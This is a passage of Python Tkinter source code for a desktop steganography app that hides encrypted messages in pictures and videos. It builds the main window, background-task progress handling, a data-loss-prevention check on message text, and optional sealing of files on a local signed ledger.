            self.run_task("Verifying audit chain…", lambda rep: self.flow.audit_verify(), done)

    def pg_anchor(self):
        if self._pg_need():
            try:
                h = self.hub.anchor_audit()
                self.toast(f"Audit head (entry {h['id']}) queued for sealing on the blockchain.", "ok")
            except Exception as e:
                self.problem(str(e), "Anchor", "warn")

    def pg_analytics(self):
        if not self._pg_need():
            return

        def done(a):
            win = self._dialog("SQL analytics · last 14 days", 760, 560)
            t = make_text(win, height=26, font=FONT_MS)
            t.pack(fill="both", expand=True, padx=16, pady=16)
            L = ["ALERTS PER DAY"] + [f"  {r['day']}  total {r['total']:>5}  high/critical {r['high_critical']:>4}  avg score {r['avg_score']}" for r in a["alerts_per_day"][-10:]]
            L += ["", "BY MODULE"] + [f"  {r['module']:<12} {r['n']:>5}  avg {r['avg_score']}  max {r['max_score']}" for r in a["by_module"]]
            L += ["", "TOP ENTITIES"] + [f"  {r['entity'][:30]:<30} {r['n']:>4} alerts  max {r['max_score']}  ({', '.join(r['modules'])})" for r in a["top_entities"]]
            L += ["", "TOP ATT&CK TECHNIQUES"] + [f"  {r['technique']:<12} {r['n']}" for r in a["top_attack_techniques"]]
            L += ["", f"95th-percentile alert score: {a['score_p95']}", "", "CASES"] + [f"  {r['status']:<8} {r['n']}  mean minutes to close: {r['mean_minutes_to_close']}" for r in a["cases"]]
            L += ["", "INTEL"] + [f"  {r['type']:<8} {r['n']} indicators (avg confidence {r['avg_confidence']})" for r in a["iocs_by_type"]]
            t.insert("1.0", "\n".join(L))
            t.configure(state="disabled")
        self.run_task("Running SQL analytics…", lambda rep: self.hub.pg.analytics(14), done)

    def pg_backup(self):
        if not self._pg_need():
            return
        p = filedialog.asksaveasfilename(defaultextension=".dump", initialfile=f"cryptosec_{time.strftime('%Y%m%d_%H%M')}.dump")
        if p:
            self.run_task("Backing up…", lambda rep: self.hub.pg.backup(p),
                          lambda r: self.problem(f"Saved {human_size(r['bytes']) if 'human_size' in globals() else r['bytes']} to\n{r['path']}\n\nRestore with:\n{r['restore']}", "Backup done", "ok"))


class CryptoSecApp(AIPages):
    def __init__(self, root: tk.Tk):
        self.root = root
        root.title("CRYPTOSEC · Steganography Suite v6.0 · AI + Blockchain Edition")
        root.geometry("1240x820")
        root.minsize(980, 640)
        root.configure(bg=BG)

        self.home = data_dir()
        self.settings = Settings(os.path.join(self.home, "settings.json"))
        self.identity = Identity.load_or_create(self.home, self.settings["alias"])
        self.ledger = Ledger(os.path.join(self.home, "ledger.jsonl"))
        self.hub = csai.AIHub(self.home, actor=self.identity.alias) if csai else None
        self.flow = SecureFlow(self.identity, self.ledger, self.settings, self.hub)
        self.var_ledger = tk.BooleanVar(value=self.settings["ledger"])
        self.var_receipts = tk.BooleanVar(value=self.settings["receipts"])
        self.var_names = tk.BooleanVar(value=self.settings["names"])
        for key, var in (("ledger", self.var_ledger), ("receipts", self.var_receipts), ("names", self.var_names)):
            var.trace_add("write", lambda *_a, k=key, v=var: self._setting_changed(k, v))
        self.sel_txid = self.sel_block = self.flash_block = None
        self.last_seal, self.dec_sha, self._receipted = None, None, set()
        self.ver_sha, self.ver_cert = None, None

        self.rsa_pub = RSAKeyManager.load_public()
        self.rsa_priv = RSAKeyManager.load_private()
        self.busy = False
        self.cancel_evt = threading.Event()
        self.cipher_id = "aes"
        self.enc_path, self.enc_info, self.capacity = None, None, 0
        self.dec_path, self.dec_raw, self.dec_cid = None, None, None
        self.last_output, self.last_payload = None, ""
        self.last_secret, self.last_cid = None, None
        self.current_page = "encode"
        self.banner = None
        self._spin = 0
        self.pages: dict[str, tk.Frame] = {}
        self.nav: dict[str, FlatButton] = {}

        self._style()
        self._build_shell()
        self._build_encode()
        self._build_decode()
        self._build_verify()
        self._build_ledger()
        self._build_keys()
        self._build_hash()
        self._build_help()
        if self.hub:
            self._build_ai_pages()
        self.select_cipher("aes")
        self.show_page("encode")
        self._bind_keys()
        self.refresh_engine()
        self.refresh_enc()
        self.refresh_dec()
        self.refresh_ledger_ui()
        if self.hub:
            self._ai_start()
        self.log("Ready. Follow the steps on the right — the ▶ arrow shows what to do next.", "ok")
        self.log(f"⛓ Ledger loaded: {self.ledger.height} block(s), {self.ledger.tx_count} signed record(s), "
                 f"{'integrity OK' if self.ledger.intact else 'INTEGRITY PROBLEM'}.",
                 "ok" if self.ledger.intact else "err")
        if not self.ledger.intact:
            root.after(700, lambda: self.problem(
                "Your blockchain ledger failed its integrity check.\n\nIt may have been edited or damaged. "
                "Open “Blockchain ledger” to see exactly which block is affected.", "Ledger problem", "err"))

    # ── shell ───────────────────────────────────────────────────────────
    def _style(self):
        st = ttk.Style()
        try:
            st.theme_use("clam")
        except tk.TclError:
            pass
        st.configure("Cyber.Horizontal.TProgressbar", troughcolor=INPUT, background=ACCENT,
                     bordercolor=INPUT, lightcolor=ACCENT, darkcolor=ACCENT, thickness=8)
        st.configure("Treeview", background=INPUT, fieldbackground=INPUT, foreground=TEXT,
                     borderwidth=0, rowheight=26, font=FONT_S)
        st.configure("Treeview.Heading", background=CARD2, foreground=MUTED, font=FONT_SB,
                     relief="flat", borderwidth=0)
        st.map("Treeview", background=[("selected", "#243049")], foreground=[("selected", ACCENT)])
        st.map("Treeview.Heading", background=[("active", CARD2)])
        st.configure("Vertical.TScrollbar", background=CARD2, troughcolor=INPUT, bordercolor=INPUT,
                     arrowcolor=MUTED, lightcolor=CARD2, darkcolor=CARD2)

    def _build_shell(self):
        r = self.root
        top = tk.Frame(r, bg=SIDEBAR)
        top.pack(fill="x")
        tk.Label(top, text="◈ CRYPTOSEC", font=("Segoe UI", 16, "bold"), fg=ACCENT, bg=SIDEBAR
                 ).pack(side="left", padx=(20, 10), pady=12)
        tk.Label(top, text="Steganography Suite  ·  AI + Blockchain Edition  ·  v6.0", font=FONT_S, fg=MUTED, bg=SIDEBAR).pack(side="left")
        self.engine_lbl = tk.Label(top, text="", font=FONT_SB, bg=SIDEBAR)
        self.engine_lbl.pack(side="right", padx=20)
        self.chain_lbl = tk.Label(top, text="", font=FONT_SB, bg=SIDEBAR, cursor="hand2")
        self.chain_lbl.pack(side="right", padx=8)
        self.chain_lbl.bind("<Button-1>", lambda e: self.show_page("ledger"))
        if self.hub:
            self._ai_chip_init(top)
        tk.Frame(r, bg=BORDER, height=1).pack(fill="x")

        sb = tk.Frame(r, bg=SIDEBAR, height=32)
        sb.pack(side="bottom", fill="x")
        sb.pack_propagate(False)
        self.spin_lbl = tk.Label(sb, text=" ", font=FONT_B, fg=ACCENT, bg=SIDEBAR, width=2)
        self.spin_lbl.pack(side="left", padx=(12, 0))
        self.status_var = tk.StringVar(value="Ready")
        tk.Label(sb, textvariable=self.status_var, font=FONT_S, fg=TEXT, bg=SIDEBAR, anchor="w"
                 ).pack(side="left", padx=4)
        self.log_toggle = FlatButton(sb, "▴ LOG", self.toggle_log, bg=SIDEBAR, fg=MUTED,
                                     font=FONT_SB, padx=10, pady=4)
        self.log_toggle.pack(side="right", padx=8)
        self.cancel_btn = FlatButton(sb, "CANCEL", self.cancel_task, bg=RED, fg="white",
                                     font=FONT_SB, padx=10, pady=3)
        self.pbar = ttk.Progressbar(sb, length=220, mode="determinate", style="Cyber.Horizontal.TProgressbar")
        self.eta_var = tk.StringVar(value="")
        self.eta_lbl = tk.Label(sb, textvariable=self.eta_var, font=FONT_MS, fg=MUTED, bg=SIDEBAR)

        self.log_frame = tk.Frame(r, bg=SIDEBAR)
        self.log_text = tk.Text(self.log_frame, height=7, bg="#080A0F", fg=TEXT, font=FONT_MS,
                                relief="flat", state="disabled", wrap="word", padx=10, pady=6)
        self.log_text.pack(fill="both", expand=True)
        for tag, col in (("info", MUTED), ("ok", GREEN), ("warn", GOLD), ("err", RED)):
            self.log_text.tag_configure(tag, foreground=col)
        self.log_visible = False

        body = tk.Frame(r, bg=BG)
        body.pack(fill="both", expand=True)
        self.body = body
        side = tk.Frame(body, bg=SIDEBAR, width=214)
        side.pack(side="left", fill="y")
        side.pack_propagate(False)
        tk.Label(side, text="MENU", font=FONT_SB, fg=MUTED, bg=SIDEBAR
                 ).pack(anchor="w", padx=18, pady=(18, 6))
        for key, label in (("encode", "🔒   Hide a message"), ("decode", "🔓   Reveal a message"),
                           ("verify", "✅   Verify authenticity"), ("ledger", "⛓   Blockchain ledger"),
                           ("keys", "🔑   Keys (advanced)"), ("hash", "#    Hash tools"),
                           ("help", "❓   Help & self-test")):
            b = FlatButton(side, label, lambda k=key: self.show_page(k), bg=SIDEBAR, fg=TEXT,
                           font=FONT, anchor="w", padx=18, pady=10)
            b.pack(fill="x")
            self.nav[key] = b
        if self.hub:
            self._ai_nav(side)
        tk.Label(side, text="Ctrl+1…9  switch page\nCtrl+O  choose file\nCtrl+Enter  run",
                 font=FONT_S, fg=MUTED, bg=SIDEBAR, justify="left").pack(side="bottom", anchor="w", padx=18, pady=16)
        tk.Frame(body, bg=BORDER, width=1).pack(side="left", fill="y")
        self.content = tk.Frame(body, bg=BG)
        self.content.pack(side="left", fill="both", expand=True)
        self.banner_host = tk.Frame(self.content, bg=BG)
        self.banner_host.pack(fill="x")

    def show_page(self, key: str):
        for k, p in self.pages.items():
            p.pack_forget()
            self.nav[k].set_color(SIDEBAR, TEXT)
        self.pages[key].pack(fill="both", expand=True)
        self.nav[key].set_color(CARD2, ACCENT)
        self.current_page = key
        for k in (self.enc_key, self.dec_key):
            if k.mode in ("rsa_enc", "rsa_dec"):
                k.refresh_rsa()
        if key == "ledger":
            self.refresh_ledger_ui()
        if self.hub and key in AI_PAGES:
            self._ai_page_shown(key)

    def _bind_keys(self):
        r = self.root
        for i, k in enumerate(("encode", "decode", "verify", "ledger", "keys", "hash", "help") + (("ai", "lab") if self.hub else ()), 1):
            r.bind(f"<Control-Key-{i}>", lambda e, k=k: self.show_page(k))
        r.bind("<Control-o>", lambda e: {"encode": self.enc_browse, "decode": self.dec_browse}.get(
            self.current_page, lambda: None)())
        r.bind("<Control-Return>", lambda e: {"encode": self.do_encode, "decode": self.do_reveal}.get(
            self.current_page, lambda: None)())

    def toggle_log(self):
        self.log_visible = not self.log_visible
        if self.log_visible:
            self.log_frame.pack(side="bottom", fill="x", before=self.body)
        else:
            self.log_frame.pack_forget()
        self.log_toggle.configure(text="▾ LOG" if self.log_visible else "▴ LOG")

    def log(self, msg: str, level: str = "info"):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self.log_text.configure(state="normal")
        self.log_text.insert("end", f"{ts}  {msg}\n", level)
        self.log_text.see("end")
        self.log_text.configure(state="disabled")
        self.status_var.set(msg.split("\n")[0][:140])

    def toast(self, msg: str, level: str = "ok"):
        col = {"ok": GREEN, "err": RED, "warn": GOLD, "info": ACCENT}.get(level, ACCENT)
        t = tk.Label(self.root, text=f"  {msg}  ", font=FONT_B, bg=CARD2, fg=col, pady=10,
                     highlightthickness=1, highlightbackground=col)
        t.place(relx=1.0, rely=1.0, x=-20, y=-52, anchor="se")
        t.lift()
        self.root.after(2800, t.destroy)
        self.log(msg, level if level in ("ok", "err", "warn") else "info")

    def problem(self, text: str, title: str = "Please check", kind: str = "warn"):
        """Modal pop-up that stays until the user clicks OK (toasts are too easy to miss)."""
        self.log(text.split("\n")[0], "err" if kind == "err" else "warn")
        (messagebox.showerror if kind == "err" else messagebox.showwarning)(title, text, parent=self.root)

    def _dialog(self, title, w=580, h=440):
        win = tk.Toplevel(self.root)
        win.title(title)
        win.configure(bg=BG)
        win.transient(self.root)
        x = self.root.winfo_rootx() + max(0, (self.root.winfo_width() - w) // 2)
        y = self.root.winfo_rooty() + max(0, (self.root.winfo_height() - h) // 3)
        win.geometry(f"{w}x{h}+{x}+{y}")
        try:
            win.wait_visibility()
            win.grab_set()
        except tk.TclError:
            pass
        return win

    def refresh_engine(self):
        ff = _find_ffmpeg()
        self.engine_lbl.configure(
            text="● VIDEO HELPER READY · SOUND KEPT" if ff else "● BASIC VIDEO MODE · NO SOUND",
            fg=GREEN if ff else GOLD)
        if ff and self.banner:
            self.banner.destroy()
            self.banner = None
        if not ff and not self.banner:
            b = tk.Frame(self.banner_host, bg="#2A2412", highlightthickness=1, highlightbackground=GOLD)
            b.pack(fill="x", padx=16, pady=(12, 0))
            tk.Label(b, text="💡  Optional: install the video helper — keeps the sound in videos and makes files smaller.",
                     font=FONT_S, bg="#2A2412", fg=TEXT).pack(side="left", padx=10, pady=8)
            FlatButton(b, "✕", lambda: self._dismiss_banner(), bg="#2A2412", fg=MUTED, font=FONT_SB,
                       padx=8, pady=4).pack(side="right", padx=4)
            FlatButton(b, "Install now", self.install_helper, bg=GOLD, font=FONT_SB, pady=5
                       ).pack(side="right", padx=4, pady=6)
            self.banner = b

    def _dismiss_banner(self):
        if self.banner:
            self.banner.destroy()
            self.banner = None

    # ── background tasks ────────────────────────────────────────────────
    def run_task(self, label, work, on_done, on_error=None):
        if self.busy:
            self.toast("Please wait — another task is still running.", "warn")
            return
        self.busy = True
        self.cancel_evt.clear()
        st = {"out": None, "prog": (0, 0, label), "t0": time.time()}

        def rep(cur, total, text=None):
            if self.cancel_evt.is_set():
                raise TaskCancelled()
            st["prog"] = (cur, total, text or st["prog"][2])

        def runner():
            try:
                st["out"] = ("ok", work(rep))
            except TaskCancelled:
                st["out"] = ("cancel", None)
            except BaseException as e:      # noqa: BLE001
                st["out"] = ("err", e)

        self.pbar.configure(value=0)
        self.cancel_btn.pack(side="right", padx=(0, 8))
        self.eta_lbl.pack(side="right", padx=6)
        self.pbar.pack(side="right", padx=6)
        self.log(label, "info")
        threading.Thread(target=runner, daemon=True).start()
        self._poll(st, on_done, on_error)

    def _poll(self, st, on_done, on_error):
        self._spin = (self._spin + 1) % 4
        self.spin_lbl.configure(text="◐◓◑◒"[self._spin])
        out = st["out"]
        cur, total, text = st["prog"]
        if out is None:
            if total > 0:
                self.pbar.configure(value=cur / total * 100)
                el = time.time() - st["t0"]
                eta = el * (total - cur) / cur if cur > 0 else 0
                self.eta_var.set(f"{cur}/{total}  ~{eta:0.0f}s left")
            else:
                self.pbar.configure(value=(float(self.pbar["value"]) + 3) % 100)
                self.eta_var.set("")
            self.status_var.set(text)
            self.root.after(50, lambda: self._poll(st, on_done, on_error))
            return
        self.busy = False
        for w in (self.cancel_btn, self.pbar, self.eta_lbl):
            w.pack_forget()
        self.spin_lbl.configure(text=" ")
        kind, val = out
        if kind == "ok":
            try:
                on_done(val)
            except Exception as e:      # noqa: BLE001
                self.problem(f"Unexpected problem while showing the result:\n{e}", kind="err")
        elif kind == "cancel":
            self.toast("Cancelled.", "warn")
        else:
            msg = friendly_error(val)
            if on_error:
                on_error(msg)
            self.problem(msg, "Something went wrong", "err")

    def cancel_task(self):
        self.cancel_evt.set()
        self.status_var.set("Cancelling…")

    # ── shared helpers ──────────────────────────────────────────────────
    def _drop_zone(self, parent, browse_cmd, drop_cb, text="⬇   Drop a file here   or   click to choose one") -> tk.Frame:
        z = tk.Frame(parent, bg=INPUT, highlightthickness=1, highlightbackground=BORDER, cursor="hand2")
        lbl = tk.Label(z, text=text, fg=ACCENT, bg=INPUT, font=FONT_B, pady=14, cursor="hand2")
        lbl.pack(fill="both", expand=True)
        for w in (z, lbl):
            w.bind("<Button-1>", lambda e: browse_cmd())
            w.bind("<Enter>", lambda e: z.configure(highlightbackground=ACCENT))
            w.bind("<Leave>", lambda e: z.configure(highlightbackground=BORDER))
            enable_drop(w, drop_cb)
        z.label = lbl
        return z

    def _split_page(self, key, title, sub):
        sf = ScrollFrame(self.content)
        self.pages[key] = sf
        inner = sf.inner
        inner.columnconfigure(0, weight=5, uniform="c")
        inner.columnconfigure(1, weight=4, uniform="c")
        inner.rowconfigure(1, weight=1)
        hdr = tk.Frame(inner, bg=BG)
        hdr.grid(row=0, column=0, columnspan=2, sticky="ew", padx=18, pady=(14, 0))
        tk.Label(hdr, text=title, font=FONT_H, fg=TEXT, bg=BG).pack(anchor="w")
        tk.Label(hdr, text=sub, font=FONT, fg=MUTED, bg=BG).pack(anchor="w")
        left = tk.Frame(inner, bg=BG)
        left.grid(row=1, column=0, sticky="nsew", padx=(16, 8), pady=12)
        right = tk.Frame(inner, bg=BG)
        right.grid(row=1, column=1, sticky="nsew", padx=(8, 16), pady=12)
        return left, right

    FILETYPES = [("Pictures & videos", " ".join("*" + e for e in sorted(IMG_EXT | VID_EXT))), ("All files", "*.*")]

    # ── HIDE PAGE ───────────────────────────────────────────────────────
    def _build_encode(self):
        left, right = self._split_page("encode", "Hide a secret message",
                                       "Pick a picture or video, write your message, protect it with a passphrase.")
        c1 = Card(left, "STEP 1  ·  CHOOSE A PICTURE OR VIDEO")
        c1.pack(fill="x")
        self.enc_drop = self._drop_zone(c1.body, self.enc_browse, self.load_encode_media)
        self.enc_drop.pack(fill="x")
        self.enc_info_lbl = tk.Label(c1.body, text="PNG, JPG, BMP  |  MP4, AVI, MKV, MOV  —  PNG pictures work best",
                                     font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.enc_info_lbl.pack(fill="x", pady=(6, 0))
        autowrap(self.enc_info_lbl)

        c2 = Card(left, "STEP 2  ·  WRITE YOUR SECRET MESSAGE")
        c2.pack(fill="x", pady=10)
        self.msg = make_text(c2.body, height=4)
        self.msg.pack(fill="x")
        self.msg.bind("<<Modified>>", self._msg_modified)
        self.cap_meter = Meter(c2.body, height=8)
        self.cap_meter.pack(fill="x", pady=(8, 0))
        self.cap_lbl = tk.Label(c2.body, text="Choose a file in step 1 to see how much text fits.",
                                font=FONT_S, fg=MUTED, bg=CARD, anchor="w")
        self.cap_lbl.pack(fill="x", pady=(4, 0))

        c3 = Card(left, "STEP 3  ·  PROTECT IT")
        c3.pack(fill="x")
        self.enc_key = KeyInput(c3.body, self, confirm=True)
        self.enc_key.pack(fill="x")
        self.adv_btn = FlatButton(c3.body, "", self.toggle_adv, bg=CARD2, fg=MUTED, font=FONT_S,
                                  padx=10, pady=6)
        self.adv_btn.pack(fill="x", pady=(10, 0))
        self.adv_frame = tk.Frame(c3.body, bg=CARD)
        grid = tk.Frame(self.adv_frame, bg=CARD)
        grid.pack(fill="x")
        self.tiles: dict[str, CipherTile] = {}
        for i, info in enumerate(CIPHERS):
            t = CipherTile(grid, info, self.select_cipher)
            t.grid(row=i // 3, column=i % 3, sticky="nsew", padx=3, pady=3)
            self.tiles[info["id"]] = t
        for c in range(3):
            grid.columnconfigure(c, weight=1, uniform="t")
        self.cipher_desc = tk.Label(self.adv_frame, text="", font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.cipher_desc.pack(fill="x", pady=(6, 0))
        autowrap(self.cipher_desc)
        self.adv_open = False

        c4 = Card(left, "STEP 4  ·  PROVE IT  (OPTIONAL)")
        c4.pack(fill="x", pady=(10, 0))
        make_check(c4.body, "⛓  Seal this file on my blockchain ledger", self.var_ledger, font=FONT_B).pack(fill="x")
        d4 = tk.Label(c4.body, text="Creates a digitally signed, tamper-evident record — proof of origin and a "
                                    "shareable certificate. Only fingerprints are stored: never your message or passphrase.",
                      font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        d4.pack(fill="x", padx=(24, 0))
        autowrap(d4)

        self.enc_btn = FlatButton(left, "🔒   HIDE MY MESSAGE", self.do_encode, bg=GREEN, pady=12,
                                  font=("Segoe UI", 11, "bold"))
        self.enc_btn.pack(fill="x", pady=(10, 0))

        pc = Card(right, "YOUR PROGRESS")
        pc.pack(fill="x")
        self.enc_check = Checklist(pc.body, ["Choose a picture or video",
                                             "Write your secret message",
                                             "Type your passphrase twice"])
        self.enc_check.pack(fill="x")
        self.enc_key.on_change = self.refresh_enc

        vc = Card(right, "PREVIEW")
        vc.pack(fill="both", expand=True, pady=10)
        self.enc_preview = MediaPreview(vc.body)
        self.enc_preview.pack(fill="both", expand=True)

        rc = Card(right, "LAST RESULT")
        rc.pack(fill="x")
        self.res_status = tk.Label(rc.body, text="Nothing hidden yet.", font=FONT_B, fg=MUTED, bg=CARD, anchor="w")
        self.res_status.pack(fill="x")
        self.res_path = tk.Label(rc.body, text="", font=FONT_MS, fg=TEAL, bg=CARD, anchor="w", justify="left")
        self.res_path.pack(fill="x")
        autowrap(self.res_path)
        br = tk.Frame(rc.body, bg=CARD)
        br.pack(fill="x", pady=(6, 0))
        self.res_dec = FlatButton(br, "Try revealing it →", self._decode_last, bg=GOLD, font=FONT_SB, pady=6)
        self.res_open = FlatButton(br, "Show in folder", lambda: reveal_in_folder(self.last_output),
                                   bg=CARD2, fg=TEXT, font=FONT_SB, pady=6)
        self.res_copy = FlatButton(br, "Copy payload", self._copy_payload, bg=CARD2, fg=TEXT, font=FONT_SB, pady=6)
        self.res_cert = FlatButton(br, "⛓ Certificate", self._cert_last, bg=CARD2, fg=TEXT, font=FONT_SB, pady=6)
        for b in (self.res_dec, self.res_open, self.res_copy, self.res_cert):
            b.pack(side="left", padx=(0, 6))
            b.set_enabled(False)

    def toggle_adv(self):
        self.adv_open = not self.adv_open
        if self.adv_open:
            self.adv_frame.pack(fill="x", pady=(6, 0), after=self.adv_btn)
        else:
            self.adv_frame.pack_forget()
        self._adv_text()

    def _adv_text(self):
        name = CIPHER_BY_ID[self.cipher_id]["name"]
        self.adv_btn.configure(text=f"{'▾' if self.adv_open else '▸'}  Advanced: choose another method "
                                    f"(now using {name})", anchor="w")

    def select_cipher(self, cid: str):
        self.cipher_id = cid
        info = CIPHER_BY_ID[cid]
        for k, t in self.tiles.items():
            t.set_selected(k == cid)
        self.cipher_desc.configure(text=info["desc"],
                                   fg=GOLD if "AUTH" in info["tag"] or info["tag"] in ("WEAK", "TOY") else MUTED)
        mode = {"pass": "pass", "caesar": "caesar", "rsa": "rsa_enc"}[info["mode"]]
        self.enc_key.set_mode(mode)
        self._adv_text()
        self.update_capacity()
        self.refresh_enc()

    def enc_browse(self):
        p = filedialog.askopenfilename(title="Choose a picture or video", filetypes=self.FILETYPES)
        if p:
            self.load_encode_media(p)

    def load_encode_media(self, path: str):
        if self.busy:
            return
        if media_kind(path) is None:
            self.problem("This file type is not supported.\n\nChoose a picture (PNG, JPG, BMP) "
                         "or a video (MP4, AVI, MKV, MOV, WEBM).")
            return
        try:
            info = media_info(path)
        except Exception as e:
            self.problem(f"Could not open this file:\n{e}", kind="err")
            return
        self.enc_path, self.enc_info, self.capacity = path, info, info["capacity"]
        self.enc_drop.label.configure(text=("🖼  " if info["kind"] == "image" else "🎞  ") + os.path.basename(path), fg=TEXT)
        extra = f"{info['w']}×{info['h']}" + (f"  ·  {info['frames']} frames" if info["kind"] == "video" else "")
        self.enc_info_lbl.configure(text=f"{info['kind'].upper()}  ·  {extra}  ·  {human_size(os.path.getsize(path))}", fg=ACCENT)
        self.enc_preview.load(path)
        self.update_capacity()
        self.refresh_enc()
        self.log(f"Loaded {os.path.basename(path)} — room for about {human_size(self.capacity)} of text", "ok")
        if info["kind"] == "video":
            self.log("Videos are saved without compression so the message survives — the output file will be big.", "info")

    def _msg_modified(self, _e=None):
        if self.msg.edit_modified():
            self.update_capacity()
            self.refresh_enc()
            self.msg.edit_modified(False)

    def _msg_state(self):
        text = self.msg.get("1.0", "end-1c")
        used = HEADER_LEN + estimate_payload_len(self.cipher_id, len(text.encode())) if text.strip() else 0
        return text, used

    def update_capacity(self):
        if not hasattr(self, "msg"):
            return
        text, used = self._msg_state()
        cap = self.capacity
        if not cap:
            self.cap_meter.set(0, MUTED)
            self.cap_lbl.configure(text=f"{len(text)} characters  ·  choose a file in step 1 to see how much fits", fg=MUTED)
            return
        ratio = used / cap
        col = GREEN if ratio < .7 else GOLD if ratio <= 1 else RED
        self.cap_meter.set(max(ratio, 0.004 if used else 0), col)
        warn = "   ⚠ TOO LONG for this file" if ratio > 1 else ""
        self.cap_lbl.configure(text=f"{len(text)} characters  ·  uses {ratio * 100:.2f}% of this file's space{warn}", fg=col)

    def _enc_states(self):
        text, used = self._msg_state()
        fits = (not self.capacity) or used <= self.capacity
        return [bool(self.enc_path), bool(text.strip()) and fits, self.enc_key.is_ready()]

    def refresh_enc(self):
        if not hasattr(self, "enc_btn") or not hasattr(self, "enc_check"):
            return
        states = self._enc_states()
        self.enc_check.set(states)
        key_txt = {"pass": "Type your passphrase twice", "caesar": "Pick a shift number",
                   "rsa_enc": "Load an RSA public key (Keys page)"}.get(self.enc_key.mode, "Choose protection")
        self.enc_check.rows[2][1].configure(text=key_txt)
        ready = all(states)
        self.enc_btn.set_color(GREEN if ready else "#3A4256", "#06121A" if ready else TEXT)

    def do_encode(self):
        if self.busy:
            return
        text, used = self._msg_state()
        missing = []
        if not self.enc_path:
            missing.append("•  Step 1: choose a picture or video")
        if not text.strip():
            missing.append("•  Step 2: write your secret message")
        elif self.capacity and used > self.capacity:
            missing.append("•  Step 2: your message is too long for this file — shorten it or choose a bigger file")
        if missing:
            self.problem("Almost there! Please finish these first:\n\n" + "\n".join(missing), "Not ready yet")
            return
        secret = self.enc_key.get_secret()
        if secret is None:
            return
        message = self.msg.get("1.0", "end-1c")
        cid, path, kind = self.cipher_id, self.enc_path, self.enc_info["kind"]
        seal_on = bool(self.settings["ledger"])
        keep_names, bits = bool(self.settings["names"]), int(self.settings["bits"])
        if self.hub and self.hub.setting("dlp_policy", "warn") != "allow":      # 🧠 instant DLP gate on the plaintext
            strong = [h for h in self.hub.detectors["dlp"].scan_text(message) if h["severity"] >= 0.7]
            if strong:
                kinds = ", ".join(sorted({h["type"] for h in strong})[:4])
                if self.hub.setting("dlp_policy") == "block":
                    self.problem(f"Your message contains sensitive data ({kinds}).\n\nThe DLP policy is set to “block”. "
                                 "Change it on the API & settings page if you really want to hide this.", "Blocked by DLP policy")
                    return
                if not messagebox.askyesno("Sensitive data detected", f"Your message appears to contain: {kinds}.\n\n"
                                           "Hiding is fine if that is intentional — but double-check the recipient.\n\nHide it anyway?", parent=self.root):
                    return

        def work(rep):
            return self.flow.hide(path, kind, message, cid, secret, seal_on, keep_names, bits, rep,
                                  self.hub.setting("dlp_policy", "warn") if self.hub else "warn")

        def done(res):
            out, payload, engine, seal, seal_err = res["out"], res["payload"], res["engine"], res["seal"], res["seal_err"]
            self.last_output, self.last_payload, self.last_seal = out, payload, seal
            self.last_secret, self.last_cid = secret, cid
            self.res_status.configure(text="✔ Message hidden and double-checked" + ("  ·  ⛓ sealed" if seal else ""),
                                      fg=GREEN)
            self.res_path.configure(text=f"{out}\n{human_size(os.path.getsize(out))}  ·  {engine}")
            for b in (self.res_dec, self.res_open, self.res_copy):
                b.set_enabled(True)
            self.res_cert.set_enabled(bool(seal))
            self.log(f"Saved: {out}  [{engine}]", "ok")
            if seal:
                self.flash_block, self.sel_block, self.sel_txid = seal["block"]["index"], None, None
                self.log(f"⛓ Sealed in block #{seal['block']['index']}  ·  record {short_hash(seal['tx']['txid'], 12)}", "ok")
                self.root.after(8000, self._unflash)
            elif seal_err:
                self.log(seal_err, "warn")
            self.refresh_ledger_ui()
            if self.hub:
                self._ai_after_hide(res)
            self.show_success(out, cid, kind, seal, seal_err)

        self.run_task("Hiding your message…", work, done)

    def show_success(self, out, cid, kind, seal=None, seal_err=None):
        win = self._dialog("Done!", 640, 720 if seal else 520 if seal_err else 480)
        tk.Label(win, text="✔  Your message is hidden!", font=("Segoe UI", 17, "bold"), fg=GREEN, bg=BG
                 ).pack(pady=(20, 4))
        tk.Label(win, text="The new file was saved here:", font=FONT_S, fg=MUTED, bg=BG).pack()
        pl = tk.Label(win, text=out, font=FONT_MS, fg=TEAL, bg=BG, wraplength=580, justify="center")
        pl.pack(padx=20, pady=(2, 10))
        steps = ("HOW TO READ IT LATER\n"
                 "1.  Open  “Reveal a message”\n"
                 f"2.  Choose THIS new file ({os.path.basename(out)}) — not the original\n"
                 "3.  Enter the same " + ("passphrase" if CIPHER_BY_ID[cid]['mode'] == 'pass' else
                                         "shift number" if cid == 'caesar' else "RSA private key is needed"))
        tk.Label(win, text=steps, font=FONT, fg=TEXT, bg=CARD, justify="left", padx=16, pady=12
                 ).pack(fill="x", padx=24)
        if seal:
            tx, blk = seal["tx"], seal["block"]
            box = tk.Frame(win, bg=CARD, highlightthickness=1, highlightbackground=GREEN)
            box.pack(fill="x", padx=24, pady=(10, 0))
            tk.Label(box, text="⛓  SEALED ON YOUR BLOCKCHAIN LEDGER", font=FONT_SB, fg=GREEN, bg=CARD
                     ).pack(anchor="w", padx=12, pady=(10, 4))
            strip = ChainStrip(box, bg=CARD, scroll=False)
            strip.pack(fill="x", padx=6)
            strip.set_blocks(self.ledger.snapshot()[-3:], flash=blk["index"])
            tk.Label(box, text=(f"Block #{blk['index']}  ·  {blk['bits']}-bit proof-of-work  ·  record "
                                f"{short_hash(tx['txid'], 12)}\nSigned by {self.identity.alias}  (ID "
                                f"{short_id(self.identity.id)}).  Only fingerprints were recorded — never your message."),
                     font=FONT_S, fg=MUTED, bg=CARD, justify="left", wraplength=580).pack(anchor="w", padx=12, pady=(2, 6))
            FlatButton(box, "Save proof certificate…", lambda: self.export_certificate(tx["txid"]), bg=ACCENT,
                       font=FONT_SB, pady=6).pack(anchor="w", padx=12, pady=(0, 10))
        elif seal_err:
            tk.Label(win, text="⚠  " + seal_err, font=FONT_S, fg=GOLD, bg=BG, wraplength=580, justify="left"
                     ).pack(padx=24, pady=(10, 0), anchor="w")
        warn = []
        if CIPHER_BY_ID[cid]["mode"] == "pass":
            warn.append("⚠  Remember your passphrase — it cannot be recovered.")
        warn.append("⚠  Share the file as a FILE / DOCUMENT. Sending it as a normal photo or video in "
                    "WhatsApp, Telegram or social media compresses it and destroys the message.")
        w = tk.Label(win, text="\n".join(warn), font=FONT_S, fg=GOLD, bg=BG, wraplength=580, justify="left")
        w.pack(padx=24, pady=10, anchor="w")
        row = tk.Frame(win, bg=BG)
        row.pack(pady=(4, 14))
